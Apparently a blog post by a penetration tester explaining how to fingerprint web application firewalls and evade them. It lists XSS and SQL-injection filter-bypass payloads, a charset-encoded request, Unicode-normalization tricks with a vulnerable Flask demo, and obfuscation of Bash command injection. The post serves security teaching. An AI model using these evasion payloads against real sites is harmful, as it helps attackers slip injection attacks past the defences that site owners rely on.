<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>5 Ways I Bypassed Your Web Application Firewall (WAF) | Ally Petitt</title>
<meta name=keywords content="WAF,Defense Evasion"><meta name=description content="Introduction This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.
WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.
Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic."><meta name=author content="Ally Petitt"><link rel=canonical href=https://ally-petitt.com/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://ally-petitt.com/assets/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ally-petitt.com/assets/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ally-petitt.com/assets/favicon-32x32.png><link rel=apple-touch-icon href=https://ally-petitt.com/assets/apple-touch-icon.png><link rel=mask-icon href=https://ally-petitt.com/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://ally-petitt.com/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="5 Ways I Bypassed Your Web Application Firewall (WAF)"><meta property="og:description" content="Introduction This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.
WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.
Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic."><meta property="og:type" content="article"><meta property="og:url" content="https://ally-petitt.com/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-06-01T00:00:00+00:00"><meta property="article:modified_time" content="2023-06-01T00:00:00+00:00"><meta property="og:site_name" content="Ally Petitt"><meta name=twitter:card content="summary"><meta name=twitter:title content="5 Ways I Bypassed Your Web Application Firewall (WAF)"><meta name=twitter:description content="Introduction This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.
WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.
Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ally-petitt.com/en/posts/"},{"@type":"ListItem","position":2,"name":"5 Ways I Bypassed Your Web Application Firewall (WAF)","item":"https://ally-petitt.com/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"5 Ways I Bypassed Your Web Application Firewall (WAF)","name":"5 Ways I Bypassed Your Web Application Firewall (WAF)","description":"Introduction This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.\nWAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.\nDepending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic.","keywords":["WAF","Defense Evasion"],"articleBody":"Introduction This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.\nWAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.\nDepending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them here. WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.\nIdentifying WAFs Manually As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the web application with a malicious query in the URL such as https://example.com/?p4yl04d3=. The HTTP response may be different than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.\nThrough a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:\nThe name of the WAF in the Server header (e.g. Server: cloudflare) Additional HTTP response headers associated with the WAF (e.g. CF-RAY: xxxxxxxxxxx) Cookies that appear to be set by a WAF (e.g. the response headerSet-Cookie: __cfduid=xxxxx) Unique response code upon submitting malicious requests. (e.g. 412) Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a FIN/RST TCP packet to the server or implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.\nAutomations There are 3 automated methods of detecting and identifying WAFs that will be discussed in this article.\nRunning an Nmap Scan The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.\n$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT Nmap scan report for example.com (xxx.xxx.xxx.xxx) Host is up (0.20s latency). PORT STATE SERVICE 443/tcp open https | http-waf-detect: IDS/IPS/WAF detected: |\\_example.com:443/?p4yl04d3= Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds WafW00f Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to detect and identify the firewall when possible.\n$ wafw00f example.com 3. WhatWaf\nIn addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s response to the various payloads.\nThe results from WhatWaf are consistent with those of Wafw00f.\nBypassing WAFs This section will outline some of the potential WAF bypass techniques with examples.\nBypassing Regex This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, finding the regular expression used by the WAF may not be an option. If the regex is accessible, this article explains regex bypass through case studies.\nCommmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using linebreaks or tabs. The examples below demonstrate some approaches to bypassing regex with comments.\n\u003csCrIpT\u003ealert(XSS)\u003c/sCriPt\u003e #changing the case of the tag \u003c\u003cscript\u003ealert(XSS)\u003c/script\u003e #prepending an additional \"\u003c\" \u003cscript\u003ealert(XSS) // #removing the closing tag \u003cscript\u003ealert`XSS`\u003c/script\u003e #using backticks instead of parenetheses java%0ascript:alert(1) #using encoded newline characters \u003ciframe src=http://malicous.com \u003c #double open angle brackets \u003cSTYLE\u003e.classname{background-image:url(\"javascript:alert(XSS)\");}\u003c/STYLE\u003e #uncommon tags \u003cimg/src=1/onerror=alert(0)\u003e #bypass space filter by using / where a space is expected \u003ca aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)\u003exss\u003c/a\u003e #extra characters Obfuscation While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.\nFunction(\"ale\"+\"rt(1)\")(); #using uncommon functions besides alert, console.log, and prompt javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding \u003ciframe src=\"javascript:alert(`xss`)\"\u003e #unicode encoding /?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement new Function`alt\\`6\\``; #using backticks instead of parentheses data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript %26%2397;lert(1) #using HTML encoding \u003ca src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)\"\u003e #Using Line Feed (LF) line breaks \u003cBODY onload!#$%\u0026()*~+-\\_.,:;?@[/|\\]^`=confirm()\u003e # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine) Additional resources include PayloadsAllTheThings and OWASP.\n2. Charset This technique involves modifying the Content-Type header to use a different charset (e.g. ibm500). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python\n$ python3 -- snip -- \u003e\u003e\u003e import urllib.parse \u003e\u003e\u003e s = '' \u003e\u003e\u003e urllib.parse.quote\\_plus(s.encode(\"IBM037\")) 'L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n' The encoded string can then be sent in the request body and uploaded to the server.\nPOST /comment/post HTTP/1.1 Host: chatapp Content-Type: application/x-www-form-urlencoded; charset=ibm500 Content-Length: 74 %A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3 Content Size In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.\nUnicode Compatibility http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg\nUnicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. It is a form of unicode equivalence.\nFor instance, the characters／(U+FF0F) and / (U+002F) are different, but in some contexts they will have the same meaning as each other. The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard forward-slash character/(U+002F) despite starting out as different characters. Digging deeper, whether ／(U+FF0F) and / (U+002F) will end up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.\nCharacters are typically normalized through one of the four standard Unicode normalization algorithms:\nNFC: Normalization Form Canonical Composition NFD: Normalization Form Canonical Decomposition NFKC: Normalization Form Compatibility Composition NFKD: Normalization Form Compatibility Decomposition NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details here). The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting unicode-compatible characters. Jorge Lahara demonstrates this in the PoC webserver below.\nfrom flask import Flask, abort, request import unicodedata from waf import waf app = Flask(\\_\\_name\\_\\_) @app.route('/') def Welcome\\_name(): name = request.args.get('name') if waf(name): abort(403, description=\"XSS Detected\") else: name = unicodedata.normalize('NFKD', name) #NFC, NFKC, NFD, and NFKD return 'Test XSS: ' + name if \\_\\_name\\_\\_ == '\\_\\_main\\_\\_': app.run(port=81) Where the inial payload of ＜img src=p onerror='prompt(1)'\u003e may have been detected by the firewall, the payload constructed with Unicode-compatible characters (＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥) would remain undetected.\nWeb servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found here.\nUninitialized Variables Another potential method is to use uninitialized variables in your request (e.g. $u) as demonstrated in this article. This is possible in command execution scenarios because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.\nhttps://www.secjuice.com/content/images/2018/08/image-3.png\nWhen on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.\nhttps://www.secjuice.com/content/images/2018/08/waf3_2.png\nMore Reading https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/ https://jlajara.gitlab.io/Bypass_WAF_Unicode https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/ https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/ https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf ","wordCount":"1302","inLanguage":"en","datePublished":"2023-06-01T00:00:00Z","dateModified":"2023-06-01T00:00:00Z","author":{"@type":"Person","name":"Ally Petitt"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://ally-petitt.com/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/"},"publisher":{"@type":"Organization","name":"Ally Petitt","logo":{"@type":"ImageObject","url":"https://ally-petitt.com/assets/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ally-petitt.com/en/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ally-petitt.com/en/archives title=Archive><span>Archive</span></a></li><li><a href=https://ally-petitt.com/en/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://ally-petitt.com/en/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://ally-petitt.com/en/about-me/ title="About Me"><span>About Me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://ally-petitt.com/en/>Home</a>&nbsp;»&nbsp;<a href=https://ally-petitt.com/en/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">5 Ways I Bypassed Your Web Application Firewall (WAF)</h1><div class=post-meta><span title='2023-06-01 00:00:00 +0000 UTC'>2023-06-01</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Ally Petitt</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#introduction aria-label=Introduction>Introduction</a></li><li><a href=#identifying-wafs aria-label="Identifying WAFs">Identifying WAFs</a><ul><li><a href=#manually aria-label=Manually>Manually</a></li><li><a href=#automations aria-label=Automations>Automations</a></li></ul></li><li><a href=#bypassing-wafs aria-label="Bypassing WAFs">Bypassing WAFs</a><ul><li><a href=#obfuscation aria-label=Obfuscation>Obfuscation</a></li><li><a href=#2-charsethttpsbookhacktricksxyznetwork-services-pentestingpentesting-webwaf-bypass aria-label="2. Charset">2. Charset</a></li></ul></li><li><a href=#more-reading aria-label="More Reading">More Reading</a></li></ul></div></details></div><div class=post-content><h1 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h1><p>This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.</p><p>WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.</p><p>Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them <a href=https://docs.python.org/3/library/re.html>here</a>. WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.</p><h1 id=identifying-wafs>Identifying WAFs<a hidden class=anchor aria-hidden=true href=#identifying-wafs>#</a></h1><h2 id=manually>Manually<a hidden class=anchor aria-hidden=true href=#manually>#</a></h2><p>As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the web application with a malicious query in the URL such as <code>https://example.com/?p4yl04d3=&lt;script>alert(document.cookie)&lt;/script></code>. The HTTP response may be different than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/0*lDR9M2gtJzPvOdWg alt="Picture of Cloudflare firewall blocking a webpage.">
Through a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:</p><ul><li>The name of the WAF in the <code>Server</code> header (e.g. <code>Server: cloudflare</code>)</li><li>Additional HTTP response headers associated with the WAF (e.g. <code>CF-RAY: xxxxxxxxxxx</code>)</li><li>Cookies that appear to be set by a WAF (e.g. the response header<code>Set-Cookie: __cfduid=xxxxx</code>)</li><li>Unique response code upon submitting malicious requests. (e.g. <code>412</code>)</li></ul><p>Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a <code>FIN/RST</code> TCP packet to the server or implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.</p><h2 id=automations>Automations<a hidden class=anchor aria-hidden=true href=#automations>#</a></h2><p>There are 3 automated methods of detecting and identifying WAFs that will be discussed in this article.</p><ol><li>Running an Nmap Scan</li></ol><p>The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com  
</span></span><span style=display:flex><span>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT  
</span></span><span style=display:flex><span>Nmap scan report for example.com (xxx.xxx.xxx.xxx)  
</span></span><span style=display:flex><span>Host is up (0.20s latency).  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>PORT STATE SERVICE  
</span></span><span style=display:flex><span>443/tcp open https  
</span></span><span style=display:flex><span>| http-waf-detect: IDS/IPS/WAF detected:  
</span></span><span style=display:flex><span>|\_example.com:443/?p4yl04d3=&lt;script&gt;alert(document.cookie)&lt;/script&gt;  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
</span></span></code></pre></div><ol start=2><li><a href=https://github.com/Ekultek/WhatWaf>WafW00f</a></li></ol><p>Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to detect and identify the firewall when possible.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ wafw00f example.com 
</span></span></code></pre></div><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*8zeEz07TxwZ8VGBIaqxVvA.png alt>
3. <a href=https://github.com/Ekultek/WhatWaf>WhatWaf</a></p><p>In addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s response to the various payloads.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/1*_pCVKq8cL3ZTghqWG5BAyQ.png alt>
The results from WhatWaf are consistent with those of Wafw00f.</p><h1 id=bypassing-wafs>Bypassing WAFs<a hidden class=anchor aria-hidden=true href=#bypassing-wafs>#</a></h1><p>This section will outline some of the potential WAF bypass techniques with examples.</p><ol><li>Bypassing Regex</li></ol><hr><p>This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, finding the regular expression used by the WAF may not be an option. If the regex is accessible, this <a href=https://www.secforce.com/blog/bypassing-wafs-web-application-filters/>article</a> explains regex bypass through case studies.</p><p>Commmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using <a href=https://www.aleksandrhovhannisyan.com/blog/crlf-vs-lf-normalizing-line-endings-in-git/>linebreaks</a> or tabs. The examples below demonstrate some approaches to bypassing regex with comments.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=display:flex><span><span style=color:#f92672>&lt;</span>sCrIpT<span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(XSS)<span style=color:#f92672>&lt;/</span>sCriPt<span style=color:#f92672>&gt;</span> <span style=color:#75715e>#changing the case of the tag  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;&lt;</span>script<span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(XSS)<span style=color:#f92672>&lt;/</span>script<span style=color:#f92672>&gt;</span> <span style=color:#75715e>#prepending an additional &#34;&lt;&#34;  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>script<span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(XSS) <span style=color:#f92672>//</span> <span style=color:#75715e>#removing the closing tag  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>script<span style=color:#f92672>&gt;</span>alert<span style=color:#f92672>`</span>XSS<span style=color:#f92672>`&lt;/</span>script<span style=color:#f92672>&gt;</span> <span style=color:#75715e>#using backticks instead of parenetheses  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>java<span style=color:#f92672>%</span><span style=color:#ae81ff>0</span>ascript:<span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>) <span style=color:#75715e>#using encoded newline characters  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>iframe src<span style=color:#f92672>=</span>http:<span style=color:#f92672>//</span>malicous.com <span style=color:#f92672>&lt;</span> <span style=color:#75715e>#double open angle brackets  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>STYLE<span style=color:#f92672>&gt;</span>.classname<span style=color:#960050;background-color:#1e0010>{</span>background<span style=color:#f92672>-</span>image:<span style=color:#a6e22e>url</span>(<span style=color:#e6db74>&#34;javascript:alert(XSS)&#34;</span>);<span style=color:#960050;background-color:#1e0010>}</span><span style=color:#f92672>&lt;/</span>STYLE<span style=color:#f92672>&gt;</span> <span style=color:#75715e>#uncommon tags  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>img<span style=color:#f92672>/</span>src<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>onerror<span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>&gt;</span> <span style=color:#75715e>#bypass space filter by using / where a space is expected  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href<span style=color:#f92672>=</span>javascript:<span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&gt;</span>xss<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;</span> <span style=color:#75715e>#extra characters
</span></span></span></code></pre></div><h2 id=obfuscation>Obfuscation<a hidden class=anchor aria-hidden=true href=#obfuscation>#</a></h2><p>While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=display:flex><span><span style=color:#a6e22e>Function</span>(<span style=color:#e6db74>&#34;ale&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;rt(1)&#34;</span>)(); <span style=color:#75715e>#using uncommon functions besides alert, console.log, and prompt  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>javascript:<span style=color:#ae81ff>74163166147401571561541571411447514115414516216450615176</span> <span style=color:#75715e>#octal encoding  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>iframe src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;javascript:alert(`xss`)&#34;</span><span style=color:#f92672>&gt;</span> <span style=color:#75715e>#unicode encoding  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>/?</span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#f92672>+</span>un<span style=color:#75715e>/**/</span>ion<span style=color:#f92672>+</span>sel<span style=color:#75715e>/**/</span>ect<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span><span style=color:#75715e>-- #using comments in SQL query to break up statement  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>new Function<span style=color:#f92672>`</span>alt<span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>`</span><span style=color:#ae81ff>6</span><span style=color:#960050;background-color:#1e0010>\</span><span style=color:#f92672>``</span>; <span style=color:#75715e>#using backticks instead of parentheses  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>data:<span style=color:#66d9ef>text</span><span style=color:#f92672>/</span>html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik<span style=color:#f92672>+</span> <span style=color:#75715e>#base64 encoding the javascript  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>%</span><span style=color:#ae81ff>26</span><span style=color:#f92672>%</span><span style=color:#ae81ff>2397</span>;<span style=color:#a6e22e>lert</span>(<span style=color:#ae81ff>1</span>) <span style=color:#75715e>#using HTML encoding  
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>a src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)&#34;</span><span style=color:#f92672>&gt;</span> <span style=color:#75715e>#Using Line Feed (LF) line breaks   
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span>BODY onload<span style=color:#f92672>!</span><span style=color:#75715e>#$%&amp;()*~+-\_.,:;?@[/|\]^`=confirm()&gt; # use any chars that aren&#39;t letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
</span></span></span></code></pre></div><p>Additional resources include <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads>PayloadsAllTheThings</a> and <a href=https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>OWASP</a>.</p><h2 id=2-charsethttpsbookhacktricksxyznetwork-services-pentestingpentesting-webwaf-bypass><a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass>2. Charset</a><a hidden class=anchor aria-hidden=true href=#2-charsethttpsbookhacktricksxyznetwork-services-pentestingpentesting-webwaf-bypass>#</a></h2><p>This technique involves modifying the <code>Content-Type</code> header to use a different charset (e.g. <code>ibm500</code>). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ python3  
</span></span><span style=display:flex><span>-- snip --  
</span></span><span style=display:flex><span>&gt;&gt;&gt; import urllib.parse  
</span></span><span style=display:flex><span>&gt;&gt;&gt; s = &#39;&lt;script&gt;alert(&#34;xss&#34;)&lt;/script&gt;&#39;  
</span></span><span style=display:flex><span>&gt;&gt;&gt; urllib.parse.quote\_plus(s.encode(&#34;IBM037&#34;))  
</span></span><span style=display:flex><span>&#39;L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n&#39;
</span></span></code></pre></div><p>The encoded string can then be sent in the request body and uploaded to the server.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>POST /comment/post HTTP/1.1  
</span></span><span style=display:flex><span>Host: chatapp  
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded; charset=ibm500  
</span></span><span style=display:flex><span>Content-Length: 74  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
</span></span></code></pre></div><ol start=3><li>Content Size</li></ol><hr><p>In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.</p><ol start=4><li>Unicode Compatibility</li></ol><hr><p><img loading=lazy src=https://cdn-images-1.medium.com/max/800/0*khYe6n5QPB7ar2GG.jpg alt>
